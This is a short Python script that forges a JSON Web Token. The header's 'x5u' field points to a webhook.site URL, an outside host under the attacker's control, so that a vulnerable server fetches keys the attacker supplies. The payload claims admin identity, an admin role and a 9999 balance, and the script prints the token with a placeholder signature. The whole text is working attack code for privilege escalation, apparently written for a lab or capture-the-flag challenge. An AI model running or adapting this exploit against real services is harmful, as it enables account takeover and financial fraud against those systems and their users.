import base64, json, time
header = {"alg":"RS256","typ":"JWT","x5u":"https://webhook.site/8b6e42ab-ec33-44d8-91fc-8e23534aa750/jwks"}
payload = {"user_id":1,"username":"admin","balance":9999.0,"role":"admin","exp":int(time.time())+3600}

def b64(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).decode().rstrip('=')
print(f"{b64(header)}.{b64(payload)}.test")
